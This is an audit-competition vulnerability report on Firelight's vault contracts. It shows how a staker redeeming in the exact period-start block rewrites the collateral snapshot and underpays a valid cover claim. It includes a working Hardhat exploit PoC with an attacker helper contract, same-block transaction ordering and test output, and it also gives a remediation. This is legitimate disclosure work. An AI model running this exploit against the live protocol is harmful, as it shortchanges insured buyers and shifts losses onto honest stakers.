# 88704 sc high boundary block redemption rewrites the collateral snapshot after capacity is committed reducing a valid claim by exactly the redeemed amount

**Submitted on Aug 14th 2026 at 15:57:27 UTC by @manvi for** [**Audit Comp | Firelight**](https://immunefi.com/audit-competition/audit-comp-firelight-1)

* **Report ID:** #88704
* **Report Type:** Smart Contract
* **Report severity:** High
* **Target:** <https://github.com/immunefi-team/audit-comp-firelight/blob/v1\\_audit\\_ready/contracts/core/FirelightVault.sol>
* **Impacts:**
  * Protocol insolvency

## Description

## Brief / Intro

I have analysed the interaction between Firelight's period-start capacity accounting, delayed withdrawals, allocation commitments, and incident payouts and observed that the collateral value used as the semantic start-of-period exposure snapshot is mutable after an allocation commitment has already relied on it.

`CoverOrderAllocator` validates the current period's matching commitment against:

```solidity
vault.totalAssetsAt(vault.currentPeriodStart())
```

`FirelightVault.payout()` later uses the same period-start historical lookup as an outer cap on how much vault collateral can be paid for a valid incident captured in that period.

However, `redeem()` and `withdraw()` move assets into delayed-withdrawal accounting and then checkpoint the reduced active-vault balance at `block.timestamp`. At the exact period boundary, that write changes what future `totalAssetsAt(periodStart)` reads return.

Therefore, if the honest allocation commitment executes first in a block whose timestamp is the exact start of period `P`, an unprivileged staker can redeem afterward in the same block:

```
allocator capacity check  → reads pre-redemption period-start value
attacker redeem           → writes lower value at the same period-start timestamp
later payout              → reads the lower historical value
```

The redeemed assets do not leave the vault. They enter `withdrawAssets[P + 1]`, which the payout logic explicitly keeps slashable for period-`P` incidents. Nevertheless, the rewritten period-start value is applied as an outer cap and prevents some or all of those still-present assets from being used.

The final E2E proves this across three attacker ownership levels:

```
attacker | redeemed | buyer shortfall | attacker preserved | honest preserved
-------------------------------------------------------------------------
 10%     |    10.00 |           10.00 |               1.00 |            9.00
 50%     |    50.00 |           50.00 |              25.00 |           25.00
100%     |   100.00 |          100.00 |             100.00 |            0.00
```

For every tested ownership level:

```
buyer vault-leg shortfall == boundary redemption
```

The 100% case is only the maximal instance. The vulnerability does not depend on the attacker owning the whole vault.

## Vulnerability Details

### 1. Allocation commitment relies on a mutable period-start lookup

`CoverOrderAllocator._computeAvailableCapacity()` values vault collateral using:

```solidity
uint256 totalAssetsCanonical = Decimals.convert(
    $.vault.totalAssetsAt($.vault.currentPeriodStart()),
    $.vaultAssetDecimals,
    CANONICAL_DECIMALS,
    Math.Rounding.Floor
);
```

`commitAllocation()` validates the resulting capacity and stores the accepted commitment, but does not bind that commitment to an immutable vault snapshot.

Settlement later uses the stored commitment and does not recompute the period-start vault value before charging premium and minting the CoverNFT.

### 2. Redemption moves assets into a slashable bucket and checkpoints the lower active balance

`redeem()` / `withdraw()` call `_requestWithdraw()` and then checkpoint the reduced active-vault balance:

```solidity
uint256 ownerBalance = _requestWithdraw(assets, shares, receiver, owner);

_logTrace(
    owner,
    ownerBalance,
    _totalSupply - shares,
    _totalAssets - assets,
    true
);
```

`_logTrace()` writes at the current timestamp:

```solidity
uint48 ts = Time.timestamp();

_traceBalanceOf[owner].push(ts, balance);
_traceTotalSupply.push(ts, _totalSupply);

if (isLogAssets) {
    _traceTotalAssets.push(ts, _totalAssets);
}
```

At the first instant of period `P`, `_requestWithdraw()` assigns the redeemed assets to `currentPeriod() + 1`, i.e. `withdrawAssets[P + 1]`.

Those assets remain physically in the vault and are still part of the withdrawal accounting that `payout()` intends to slash.

### 3. The period-start historical value can change after commitment

`Checkpoints.Trace256.push()` replaces the latest value when the same timestamp key is reused:

```solidity
if (exists && key == lastKey) {
    self._values[len - 1] = value;
} else {
    self._trace.push(key, uint208(len));
    self._values.push(value);
}
```

Even where no checkpoint existed exactly at the period boundary before redemption, inserting a checkpoint at that boundary changes the historical lookup from the inherited pre-boundary value to the new post-redemption value.

Thus the same semantic timestamp can be observed differently by commitment and payout:

```
commitAllocation: totalAssetsAt(start(P)) = pre-redemption value
later payout:     totalAssetsAt(start(P)) = post-redemption value
```

### 4. `payout()` caps by the rewritten historical value before using slashable withdrawals

`FirelightVault.payout()` includes delayed-withdrawal buckets:

```solidity
uint256 assetsAtCapturePeriod =
    totalAssetsAt(capturePeriodStart);

uint256 currentActiveAssets =
    totalAssets();

uint256 capturePeriodWithdrawals =
    withdrawAssets[capturePeriod + 1];

uint256 activePayableAmount =
    currentActiveAssets
    + capturePeriodWithdrawals
    + nextPeriodWithdrawals;
```

But applies `assetsAtCapturePeriod` as an outer cap:

```solidity
paidAmount = Math.min(
    amount,
    Math.min(
        assetsAtCapturePeriod,
        activePayableAmount
    )
);
```

Let:

```
T = vault assets before the boundary
R = attacker redemption in the boundary block
```

After redemption:

```
period-start historical cap = T - R
pending/slashable withdrawal = R
physical assets in vault     = T
```

For a full vault-leg claim of `T`:

```
vault payout    = T - R
buyer shortfall = R
```

The claim is therefore underpaid by exactly the amount moved into the supposedly slashable delayed-withdrawal path.

## Ownership sweep — no 100% vault ownership required

The final E2E runs isolated 10%, 50%, and 100% ownership scenarios:

```
10% attacker:
redeemed               = 10
valid-claim shortfall  = 10
attacker preserved     = 1
honest stakers preserve= 9

50% attacker:
redeemed               = 50
valid-claim shortfall  = 50
attacker preserved     = 25
honest stakers preserve= 25

100% attacker:
redeemed               = 100
valid-claim shortfall  = 100
attacker preserved     = 100
honest stakers preserve= 0
```

The protocol-side shortfall is always:

```
shortfall = R
```

and the attacker's own preserved amount is:

```
floor(R² / T)
```

Therefore a positive attacker benefit exists below dominant ownership. Dominant ownership is only required for the maximal case where the attacker personally preserves the whole shortfall.

## Attack sequence

{% stepper %}
{% step %}

## Vault collateral and matching setup

Vault collateral is `100`.

FLB is funded with `10` USDC and approves `IncidentManager`.

Buyer is funded and approves premium before matching.

A normal period-`P` order requests `110` cover.

Strict 1:1 capacity is used: `minCAR = effectiveLeverage = 12000`, tolerance `0`.
{% endstep %}

{% step %}

## Prepare the boundary redemption

The attacker owns a non-zero fraction of vault shares.

The attacker grants share allowance to a helper contract; the helper owns zero shares.

Unauthorized helper callers revert.

Wrong-time helper execution reverts without spending shares or allowance.

Immediately before period `P`, the price feed is refreshed.
{% endstep %}

{% step %}

## Commit capacity and redeem at the period boundary

The honest allocator commitment is submitted.

The attacker's conditional redemption is submitted afterward.

Both transactions are included in a block whose timestamp is exactly `start(P)`.

The commitment executes first and accepts full `110` capacity.

The redemption executes second.

Redeemed assets enter `withdrawAssets[P + 1]`.

The full physical vault balance remains inside the vault.

`totalAssetsAt(start(P))` is reduced by exactly the redeemed amount.
{% endstep %}

{% step %}

## Settle cover and process the valid loss

Settlement succeeds against the stored commitment.

Premium is collected and a real CoverNFT is minted.

The valid loss occurs only after settlement.

Incident is created, confirmed, assessed for `110`, submitted, and approved.

Funded FLB correctly pays `10`.

The vault leg is underpaid by exactly the boundary redemption.

The incident still becomes `CLOSED`.
{% endstep %}

{% step %}

## Claim escaped collateral

After the delay, the attacker claims the portion of escaped value still allocated to their pending withdrawal.
{% endstep %}
{% endstepper %}

## Why the known FLB issue does not apply

Every scenario uses:

```
FLB balance                      : 10 USDC
FLB allowance to IncidentManager : unlimited
FLB payout                       : succeeds
```

The shortfall occurs entirely in the vault leg.

## Why this is not the retroactive-cover / delayed-premium issue

The buyer is funded and approved before matching.

The policy settles before the loss.

The attack does not depend on post-loss approval.

## Why this is not the cross-period liability-reservation finding

These issues violate different invariants and require different fixes.

**Cross-period liability reservation:**

```
period-start asset snapshot is correct,
but collateral is economically encumbered
by previous-period liabilities.

Fix: reserve/deduct prior-period liabilities.
```

**Boundary checkpoint mutation:**

```
no previous-period liability is required.
The current period's own collateral snapshot
changes after commitment acceptance.

Fix: immutable per-period collateral snapshot.
```

A liability reserve does not fix a current-period snapshot that can be rewritten, and an immutable current-period snapshot does not reserve previous-period liabilities.

## Why this is distinct from post-payout stale capacity

Post-payout stale capacity:

```
assets physically leave
historical snapshot stays too HIGH
future capacity is overstated
```

Boundary checkpoint mutation:

```
assets remain physically inside the vault
they enter a still-slashable withdrawal bucket
historical period-start value becomes too LOW
current-period payout is understated
```

## Why this does not require privileged-role misconduct

The value-moving adversarial action is an ordinary staker `redeem()`.

The attacker needs no privileged role.

The honest allocator simply submits a commitment that passes the on-chain capacity check.

Incident roles later process a valid post-settlement loss and an assessment exactly within settled cover.

No privileged actor needs to fabricate a loss, knowingly misstate capacity, or make an intentionally incorrect business decision.

## Feasibility limitation

The exploit requires:

```
block.timestamp == exact mathematical period start
```

and:

```
commitAllocation executes before redeem
```

The E2E proves this state transition locally by asserting:

```
same block                  : YES
exact period-start timestamp: YES
commit tx index             : before redeem tx index
```

The helper also proves:

```
helper owns shares          : NO
attacker remains owner      : YES
share allowance only        : YES
unauthorized caller         : REVERTS
wrong-time call             : REVERTS
shares spent on wrong time  : NO
allowance spent wrong time  : NO
```

The remaining operational question is whether Firelight's production matcher can place a legitimate `commitAllocation()` transaction in the exact period-start block.

If it always waits for that block to finalize before broadcasting, this exploit path is unreachable.

If it broadcasts/prepositions for first-boundary-block inclusion, or otherwise permits the commitment to land there, the demonstrated attack is reachable.

I am explicitly disclosing this condition for triage.

## Impact Details

The selected impact is:

> **Protocol insolvency**

The final E2E demonstrates:

```
attacker | redeemed | valid-claim shortfall | attacker preserved
-----------------------------------------------------------------
 10%     |    10.00 |                 10.00 |               1.00
 50%     |    50.00 |                 50.00 |              25.00
100%     |   100.00 |                100.00 |             100.00
```

In every scenario:

* FLB is funded and pays normally;
* buyer is funded and approved before matching;
* cover settles before the loss;
* assessment is within settled cover;
* the vault-leg shortfall equals the boundary redemption;
* the shortfall assets remain physically present;
* and the incident still closes.

The premium amount is not relied upon as the impact. Premium collection only proves normal policy settlement.

The maximal demonstrated case is:

```
valid assessed loss      : 110
FLB paid                 : 10
vault leg expected       : 100
vault leg actually paid  : 0
valid claim shortfall    : 100
attacker later preserves : 100
incident                 : CLOSED
```

## Recommended remediation

Bind allocation commitment and payout to one immutable per-period collateral snapshot.

For example:

```solidity
mapping(uint256 period => uint256 assets)
    public periodAssetsSnapshot;

mapping(uint256 period => bool initialized)
    public periodAssetsSnapshotInitialized;
```

Finalize the snapshot once per period and never allow later state changes to reinterpret it.

Both:

```
CoverOrderAllocator.commitAllocation()
FirelightVault.payout()
```

should consume the same immutable value.

It is also reasonable to bind `AllocationCommitment` directly to the snapshot value used during matching.

Blocking only `withdraw()` / `redeem()` at the boundary is weaker because another path that writes `_traceTotalAssets` at that timestamp could recreate the same failure.

## References

Primary affected asset:

* `contracts/core/FirelightVault.sol`

Related in-scope contracts:

* `contracts/core/CoverOrderAllocator.sol`
* `contracts/core/IncidentManager.sol`
* `contracts/core/lib/Checkpoints.sol`
* `contracts/core/interfaces/IFirelightVault.sol`
* `contracts/core/interfaces/ICoverOrderAllocator.sol`

Relevant logic:

* `CoverOrderAllocator._computeAvailableCapacity()` — reads `vault.totalAssetsAt(vault.currentPeriodStart())`.
* `CoverOrderAllocator.commitAllocation()` — validates and stores the commitment.
* `CoverOrderAllocator._settleCoverOrder()` — settles against the stored commitment without recomputing the mutated period-start value.
* `FirelightVault.redeem()` / `withdraw()` — create delayed withdrawals and checkpoint reduced active assets.
* `FirelightVault._requestWithdraw()` — assigns redemptions to `currentPeriod() + 1`.
* `FirelightVault._logTrace()` — writes `_traceTotalAssets` at `Time.timestamp()`.
* `Checkpoints.Trace256.push()` — replaces/redefines a same-key checkpoint.
* `FirelightVault.totalAssetsAt()` — historical lookup reused by capacity and payout semantics.
* `FirelightVault.payout()` — includes delayed withdrawals but caps payout by `assetsAtCapturePeriod`.
* `IncidentManager._executePayout()` — pays FLB first and asks the vault for the remainder.
* `IncidentManager.approveCurrentAssessment()` — completes payout and closes the incident.

***

## Proof of Concept

## PoC classification

This is a repo-native E2E integration PoC using the real in-scope:

* `FirelightVault`;
* `CoverOrderAllocator`;
* `CoverNFT`;
* `IncidentManager`.

Only deterministic external dependencies are mocked:

* `MockERC20`;
* `MockAggregatorV3`.

The helper owns no vault shares. The attacker remains the owner and grants only ERC20 share allowance.

The PoC uses:

```
contracts/test/BoundaryRedeemerAllowance.poc.sol
test/audit/ZZ_PeriodBoundaryCheckpointEscape.best.poc.js
```

## Helper contract

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.28;

interface IBoundaryVault {
    function redeem(
        uint256 shares,
        address receiver,
        address owner
    ) external returns (uint256 assets);
}

/// @dev Holds no vault shares. The staker remains the owner and only grants
/// this helper ERC20 share allowance, so a missed boundary cannot strand stake.
contract BoundaryRedeemerAllowancePoc {
    IBoundaryVault public immutable vault;
    address public immutable controller;
    uint48 public immutable targetTimestamp;

    constructor(
        address vault_,
        address controller_,
        uint48 targetTimestamp_
    ) {
        vault = IBoundaryVault(vault_);
        controller = controller_;
        targetTimestamp = targetTimestamp_;
    }

    function redeemAtBoundary(uint256 shares) external returns (uint256 assets) {
        require(msg.sender == controller, "not controller");
        require(block.timestamp == targetTimestamp, "not boundary");

        // msg.sender at the vault is this helper. The real staker remains owner,
        // so FirelightVault consumes only the allowance granted to this helper.
        assets = vault.redeem(
            shares,
            controller,
            controller
        );
    }
}
```

## Complete E2E PoC

```javascript
const { expect } = require('chai')
const { ethers, upgrades } = require('hardhat')
const { StandardMerkleTree } = require('@openzeppelin/merkle-tree')

const DAY = 24 * 3600
const WEEK = 7 * DAY
const E6 = 10n ** 6n
const E18 = 10n ** 18n
const BPS = 10_000n

const abiCoder = ethers.AbiCoder.defaultAbiCoder()

const marketIdOf = (chainId, protocol, market) =>
  ethers.keccak256(
    abiCoder.encode(
      ['uint64', 'string', 'bytes32'],
      [chainId, protocol, market]
    )
  )

const fmt = (x) => Number(ethers.formatUnits(x, 6)).toFixed(2)

async function advanceTo(ts) {
  await ethers.provider.send('evm_setNextBlockTimestamp', [Number(ts)])
  await ethers.provider.send('evm_mine', [])
}

async function deploySystem() {
  const s = await ethers.getSigners()
  const [
    deployer,
    admin,
    curator,
    allocatorRole,
    configAdmin,
    adminRole,
    premiumCollector,
    flbWallet,
    approver,
    rejecter,
    invalidator,
    payoutAdmin,
    priceFeedAdmin,
    payoutReceiver,
    honestStaker,
    attacker,
    buyer,
    stranger,
  ] = s

  const MockERC20 = await ethers.getContractFactory('MockERC20')
  const asset = await MockERC20.deploy('fXRP', 'fXRP', 6)
  const usdc = await MockERC20.deploy('USDC', 'USDC', 6)

  const initBytes = abiCoder.encode(
    ['address', 'address', 'address', 'address', 'address', 'address', 'uint256', 'uint48'],
    [
      deployer.address,
      deployer.address,
      deployer.address,
      deployer.address,
      deployer.address,
      deployer.address,
      10n ** 24n,
      WEEK,
    ]
  )

  const VaultF = await ethers.getContractFactory('FirelightVault')
  const vault = await upgrades.deployProxy(VaultF, [
    await asset.getAddress(),
    'stfXRP',
    'stfXRP',
    initBytes,
  ])

  const Agg = await ethers.getContractFactory('MockAggregatorV3')
  const priceFeed = await Agg.deploy(18, E18)

  const NFTF = await ethers.getContractFactory('CoverNFT')
  const coverNFT = await upgrades.deployProxy(
    NFTF,
    [
      'Cover',
      'CVR',
      '',
      admin.address,
      deployer.address,
      ethers.ZeroAddress,
      ethers.ZeroAddress,
    ],
    { kind: 'transparent' }
  )

  const PROTOCOL = 'Boundary-Protocol'
  const MARKET = ethers.encodeBytes32String('boundary-market')
  const marketId = marketIdOf(1, PROTOCOL, MARKET)

  const AllocF = await ethers.getContractFactory('CoverOrderAllocator')
  const allocator = await upgrades.deployProxy(
    AllocF,
    [
      {
        vault: await vault.getAddress(),
        premiumCollector: premiumCollector.address,
        coverNFT: await coverNFT.getAddress(),
        priceFeedAdapter: await priceFeed.getAddress(),
        maxPriceAge: WEEK,
        premiumTokens: [await usdc.getAddress()],
        admin: admin.address,
        adminRole: adminRole.address,
        curatorRole: curator.address,
        allocatorRole: allocatorRole.address,
        configAdminRole: configAdmin.address,
        initialProtocolConcentrations: [
          {
            chainId: 1,
            protocol: PROTOCOL,
            maxProtocolConcentrationBps: 10000,
          },
        ],
        newMarkets: [
          {
            chainId: 1,
            protocol: PROTOCOL,
            market: MARKET,
          },
        ],
        capacityConfig: {
          minCAR: 12000,
          firstLossBufferToken: await usdc.getAddress(),
          firstLossBuffer: flbWallet.address,
          effectiveLeverage: 12000,
          minOrderMarketCoverAmount: 1,
          divergenceToleranceBps: 0,
        },
      },
    ],
    {
      kind: 'transparent',
      unsafeAllow: ['missing-initializer-call'],
    }
  )

  await coverNFT
    .connect(admin)
    .grantRole(ethers.id('MINTER_ROLE'), await allocator.getAddress())

  const IMF = await ethers.getContractFactory('IncidentManager')
  const im = await upgrades.deployProxy(
    IMF,
    [
      admin.address,
      curator.address,
      approver.address,
      rejecter.address,
      invalidator.address,
      configAdmin.address,
      payoutAdmin.address,
      priceFeedAdmin.address,
      payoutReceiver.address,
      await allocator.getAddress(),
      await priceFeed.getAddress(),
      WEEK,
    ],
    {
      kind: 'transparent',
      unsafeAllow: ['missing-initializer-call'],
    }
  )

  await vault.grantRole(await vault.PAYOUT_ROLE(), await im.getAddress())
  await vault.grantRole(await vault.INCIDENT_ROLE(), await im.getAddress())
  await vault.grantRole(await vault.PAYOUT_ALLOWLIST_ROLE(), deployer.address)
  await vault.addToPayoutAllowlist(payoutReceiver.address)

  return {
    deployer,
    curator,
    allocatorRole,
    approver,
    premiumCollector,
    flbWallet,
    payoutReceiver,
    honestStaker,
    attacker,
    buyer,
    stranger,
    asset,
    usdc,
    vault,
    allocator,
    coverNFT,
    im,
    priceFeed,
    marketId,
  }
}

async function waitForSettlementGrace(c, period) {
  const commit = await c.allocator.getAllocationCommitment(period)
  const grace = Number(commit.graceExpiresAt)
  const now = Number((await ethers.provider.getBlock('latest')).timestamp)

  if (now < grace) {
    await advanceTo(grace)
  }
}

async function runBoundaryScenario(attackerShareBps, tag) {
  const c = await deploySystem()

  const totalVaultBacking = 100n * E6
  const flbBacking = 10n * E6
  const cover = 110n * E18
  const requestedVaultLeg = 100n * E6

  // -----------------------------------------------------------------------
  // Seed one real 100-unit vault, then split the share ownership.
  // This avoids deposit-order rounding from obscuring the ownership sweep.
  // -----------------------------------------------------------------------
  await c.asset.mint(c.honestStaker.address, totalVaultBacking)
  await c.asset
    .connect(c.honestStaker)
    .approve(await c.vault.getAddress(), totalVaultBacking)
  await c.vault
    .connect(c.honestStaker)
    .deposit(totalVaultBacking, c.honestStaker.address)

  const totalShares = await c.vault.balanceOf(c.honestStaker.address)
  const attackerShares = (totalShares * BigInt(attackerShareBps)) / BPS

  expect(attackerShares).to.be.gt(0n)

  await c.vault
    .connect(c.honestStaker)
    .transfer(c.attacker.address, attackerShares)

  expect(await c.vault.totalAssets()).to.equal(totalVaultBacking)

  // Properly funded and approved FLB: the known FLB issue is not involved.
  await c.usdc.mint(c.flbWallet.address, flbBacking)
  await c.usdc
    .connect(c.flbWallet)
    .approve(await c.im.getAddress(), ethers.MaxUint256)

  // Buyer is funded and approved before matching and before the later loss.
  await c.usdc.mint(c.buyer.address, 1_000n * E6)
  await c.usdc
    .connect(c.buyer)
    .approve(await c.allocator.getAddress(), ethers.MaxUint256)

  expect(await c.vault.currentPeriod()).to.equal(0n)
  const p1Start = Number(await c.vault.currentPeriodEnd())

  const orderId = await c.allocator.nextCoverOrderId()
  await c.allocator.connect(c.curator).createCoverOrder(
    c.buyer.address,
    c.buyer.address,
    `boundary-beneficiary-${tag}`,
    await c.usdc.getAddress(),
    [
      {
        marketId: c.marketId,
        coverRateAnnual: 500,
        coverAmount: cover,
      },
    ],
    0
  )

  const HelperF = await ethers.getContractFactory('BoundaryRedeemerAllowancePoc')
  const helper = await HelperF.deploy(
    await c.vault.getAddress(),
    c.attacker.address,
    p1Start
  )
  const helperAddr = await helper.getAddress()

  // -----------------------------------------------------------------------
  // SAFE CONDITIONALITY:
  // helper owns NO shares; attacker merely grants share allowance.
  // Missing the boundary leaves the attacker's shares untouched and usable.
  // -----------------------------------------------------------------------
  expect(await c.vault.balanceOf(helperAddr)).to.equal(0n)
  expect(await c.vault.balanceOf(c.attacker.address)).to.equal(attackerShares)

  await c.vault
    .connect(c.attacker)
    .approve(helperAddr, ethers.MaxUint256)

  const attackerSharesBeforeWrongTime =
    await c.vault.balanceOf(c.attacker.address)
  const allowanceBeforeWrongTime =
    await c.vault.allowance(c.attacker.address, helperAddr)

  await expect(
    helper.connect(c.stranger).redeemAtBoundary(attackerShares)
  ).to.be.revertedWith('not controller')

  await expect(
    helper.connect(c.attacker).redeemAtBoundary(attackerShares)
  ).to.be.revertedWith('not boundary')

  expect(await c.vault.balanceOf(c.attacker.address))
    .to.equal(attackerSharesBeforeWrongTime)

  expect(await c.vault.allowance(c.attacker.address, helperAddr))
    .to.equal(allowanceBeforeWrongTime)

  // Real Merkle allocation.
  const tree = StandardMerkleTree.of(
    [[orderId, [[c.marketId, cover]]]],
    ['uint256', '(bytes32,uint256)[]']
  )

  // Fresh price just before the boundary. This does not touch vault checkpoints.
  await advanceTo(p1Start - 120)
  await c.priceFeed.setAnswer(E18)

  // -----------------------------------------------------------------------
  // Exact boundary block:
  //   tx 0 = honest allocator commitment
  //   tx 1 = attacker redemption via allowance-only helper
  // -----------------------------------------------------------------------
  await ethers.provider.send('evm_setAutomine', [false])

  let commitTx
  let redeemTx

  try {
    await ethers.provider.send('evm_setNextBlockTimestamp', [p1Start])

    commitTx = await c.allocator
      .connect(c.allocatorRole)
      .commitAllocation(
        1,
        tree.root,
        cover,
        cover,
        {
          gasPrice: ethers.parseUnits('100', 'gwei'),
          gasLimit: 2_000_000,
        }
      )

    // Submitted only after the commitment tx exists in the mempool.
    redeemTx = await helper
      .connect(c.attacker)
      .redeemAtBoundary(
        attackerShares,
        {
          gasPrice: ethers.parseUnits('90', 'gwei'),
          gasLimit: 1_000_000,
        }
      )

    await ethers.provider.send('evm_mine', [])
  } finally {
    await ethers.provider.send('evm_setAutomine', [true])
  }

  const commitReceipt = await commitTx.wait()
  const redeemReceipt = await redeemTx.wait()

  expect(commitReceipt.blockNumber).to.equal(redeemReceipt.blockNumber)

  const boundaryBlock =
    await ethers.provider.getBlock(commitReceipt.blockNumber)

  expect(boundaryBlock.timestamp).to.equal(p1Start)

  const commitIndex =
    commitReceipt.index ?? commitReceipt.transactionIndex
  const redeemIndex =
    redeemReceipt.index ?? redeemReceipt.transactionIndex

  expect(commitIndex).to.be.lessThan(redeemIndex)
  expect(await c.vault.currentPeriod()).to.equal(1n)

  const commitment =
    await c.allocator.getAllocationCommitment(1)

  expect(commitment.totalAvailableCapacity).to.equal(cover)
  expect(commitment.totalDeclaredAllocated).to.equal(cover)

  // -----------------------------------------------------------------------
  // Measure the actual amount moved to the slashable withdrawal bucket.
  // This is R in the economic derivation.
  // -----------------------------------------------------------------------
  const redeemed = await c.vault.withdrawAssets(2n)
  const postBoundarySnapshot = await c.vault.totalAssetsAt(p1Start)

  expect(redeemed).to.be.gt(0n)

  // The period-start lookup has been reduced by exactly the redeemed amount.
  expect(postBoundarySnapshot + redeemed).to.equal(totalVaultBacking)

  // Nothing left the vault: the full 100 units remain physically present.
  expect(await c.asset.balanceOf(await c.vault.getAddress()))
    .to.equal(totalVaultBacking)

  expect(await c.vault.pendingWithdrawAssets())
    .to.equal(redeemed)

  expect(await c.vault.totalAssets())
    .to.equal(postBoundarySnapshot)

  // -----------------------------------------------------------------------
  // Settlement consumes the already-stored commitment, not the mutated
  // period-start snapshot.
  // -----------------------------------------------------------------------
  await waitForSettlementGrace(c, 1)

  const buyerBefore =
    await c.usdc.balanceOf(c.buyer.address)

  await c.allocator
    .connect(c.allocatorRole)
    .settleCoverOrder(
      orderId,
      [
        {
          marketId: c.marketId,
          allocatedCover: cover,
        },
      ],
      tree.getProof(0)
    )

  const premiumPaid =
    buyerBefore - (await c.usdc.balanceOf(c.buyer.address))

  expect(premiumPaid).to.be.gt(0n)
  expect(await c.coverNFT.ownerOf(orderId)).to.equal(c.buyer.address)

  // -----------------------------------------------------------------------
  // Valid loss only AFTER cover settlement.
  // -----------------------------------------------------------------------
  const latest = await ethers.provider.getBlock('latest')
  const lossTs = Number(latest.timestamp) + 300

  await advanceTo(lossTs)
  expect(await c.vault.periodAtTimestamp(lossTs)).to.equal(1n)

  const incidentId = await c.im.nextIncidentId()

  await c.im.connect(c.curator).createIncident(
    lossTs,
    `Boundary checkpoint escape ${tag}`,
    ethers.id(`boundary-checkpoint-${tag}`)
  )

  await c.im
    .connect(c.curator)
    .confirmIncident(incidentId, `ipfs://boundary-checkpoint-${tag}`)

  await c.im.connect(c.curator).addAssessmentLosses(
    incidentId,
    [
      {
        coverTokenId: orderId,
        marketId: c.marketId,
        amount: cover,
      },
    ]
  )

  await c.im.connect(c.curator).submitCurrentAssessment(incidentId)

  await c.priceFeed.setAnswer(E18)

  const receiverUsdcBefore =
    await c.usdc.balanceOf(c.payoutReceiver.address)
  const receiverAssetBefore =
    await c.asset.balanceOf(c.payoutReceiver.address)

  await c.im
    .connect(c.approver)
    .approveCurrentAssessment(incidentId)

  const flbPaid =
    (await c.usdc.balanceOf(c.payoutReceiver.address)) -
    receiverUsdcBefore

  const vaultPaid =
    (await c.asset.balanceOf(c.payoutReceiver.address)) -
    receiverAssetBefore

  expect(flbPaid).to.equal(flbBacking)

  // -----------------------------------------------------------------------
  // CORE PROTOCOL-SIDE INVARIANT:
  // buyer vault-leg shortfall == amount redeemed at the boundary.
  // -----------------------------------------------------------------------
  const buyerShortfall = requestedVaultLeg - vaultPaid
  expect(buyerShortfall).to.equal(redeemed)

  // The shortfall is still physically inside the vault.
  expect(await c.asset.balanceOf(await c.vault.getAddress()))
    .to.equal(buyerShortfall)

  const [incident] = await c.im.getIncident(incidentId)
  expect(incident.status).to.equal(4n) // CLOSED

  // -----------------------------------------------------------------------
  // PRO-RATA ECONOMICS:
  // attacker preserves floor(R^2 / T).
  // The remainder of the buyer shortfall benefits the still-active stakers.
  // This proves a positive attacker benefit even below dominant ownership.
  // -----------------------------------------------------------------------
  const attackerClaimable =
    await c.vault.withdrawalsOf(2n, c.attacker.address)

  const honestActiveRemaining =
    await c.vault.totalAssets()

  const expectedAttackerPreserved =
    (redeemed * redeemed) / totalVaultBacking

  expect(attackerClaimable)
    .to.equal(expectedAttackerPreserved)

  expect(honestActiveRemaining)
    .to.equal(redeemed - expectedAttackerPreserved)

  expect(attackerClaimable + honestActiveRemaining)
    .to.equal(buyerShortfall)

  expect(attackerClaimable).to.be.gt(0n)

  // -----------------------------------------------------------------------
  // Attacker actually realizes the preserved/slash-escaped collateral.
  // -----------------------------------------------------------------------
  await advanceTo(p1Start + 2 * WEEK + 60)
  expect(await c.vault.currentPeriod()).to.equal(3n)

  const attackerBeforeClaim =
    await c.asset.balanceOf(c.attacker.address)

  await c.vault
    .connect(c.attacker)
    .claimWithdraw(2n)

  const attackerClaimed =
    (await c.asset.balanceOf(c.attacker.address)) -
    attackerBeforeClaim

  expect(attackerClaimed).to.equal(attackerClaimable)

  // Honest active capital remains in the vault after attacker claim.
  expect(await c.vault.totalAssets())
    .to.equal(honestActiveRemaining)

  return {
    attackerShareBps,
    redeemed,
    buyerShortfall,
    attackerPreserved: attackerClaimed,
    honestPreserved: honestActiveRemaining,
    premiumPaid,
    vaultPaid,
    flbPaid,
    commitIndex,
    redeemIndex,
  }
}

describe(
  'AUDIT BEST E2E: boundary checkpoint rewrite causes a protocol shortfall at any attacker share',
  function () {
    this.timeout(120000)

    it(
      'proves exact-boundary ordering, safe allowance-only conditionality, funded FLB, and 10%/50%/100% ownership economics',
      async function () {
        const rows = []

        for (const [bps, tag] of [
          [1000, '10pct'],
          [5000, '50pct'],
          [10000, '100pct'],
        ]) {
          rows.push(
            await runBoundaryScenario(
              bps,
              tag
            )
          )
        }

        console.log('')
        console.log('        ===== BOUNDARY CHECKPOINT OWNERSHIP SWEEP =====')
        console.log('        attacker | redeemed | buyer shortfall | attacker preserved | honest preserved')
        console.log('        -------------------------------------------------------------------------')

        for (const r of rows) {
          const pct = (r.attackerShareBps / 100).toFixed(0).padStart(3)

          console.log(
            `        ${pct}%      | ${fmt(r.redeemed).padStart(8)} | ${fmt(r.buyerShortfall).padStart(15)} | ${fmt(r.attackerPreserved).padStart(18)} | ${fmt(r.honestPreserved).padStart(15)}`
          )
        }

        console.log('')
        console.log('        PROVEN INVARIANTS:')
        console.log('        - every scenario uses a properly funded + approved 10 USDC FLB')
        console.log('        - buyer is funded/approved before matching and loss occurs after settlement')
        console.log('        - attacker helper holds zero shares and is allowance-only')
        console.log('        - wrong-time execution reverts without spending shares or allowance')
        console.log('        - unauthorized helper callers are rejected')
        console.log('        - allocator commit and redemption execute in the same exact-boundary block')
        console.log('        - allocator commitment executes before attacker redemption')
        console.log('        - buyer vault-leg shortfall equals the boundary redemption exactly')
        console.log('        - attacker preserves floor(R^2/T), so benefit remains positive below dominant ownership')
        console.log('        - incident closes despite the shortfall')
        console.log('')
        console.log('        RESULT: the bug is protocol-side rather than dependent on a 100% attacker vault. Any non-zero boundary redemption lowers the valid claim payout by that redeemed amount even though the assets never leave the vault; the attacker personally preserves floor(R^2/T) while the remainder of the shortfall stays with active stakers.')
      }
    )
  }
)
```

## Command

I ran:

```bash
cd /workspaces/audit-comp-firelight

npx hardhat compile

npx hardhat test \
  test/audit/ZZ_PeriodBoundaryCheckpointEscape.best.poc.js \
  2>&1 | tee boundary-checkpoint-best-output.txt
```

## Observed output

```
AUDIT BEST E2E: boundary checkpoint rewrite causes a protocol shortfall at any attacker share

      ===== BOUNDARY CHECKPOINT OWNERSHIP SWEEP =====
      attacker | redeemed | buyer shortfall | attacker preserved | honest preserved
      -------------------------------------------------------------------------
       10%      |    10.00 |           10.00 |               1.00 |            9.00
       50%      |    50.00 |           50.00 |              25.00 |           25.00
      100%      |   100.00 |          100.00 |             100.00 |            0.00

      PROVEN INVARIANTS:
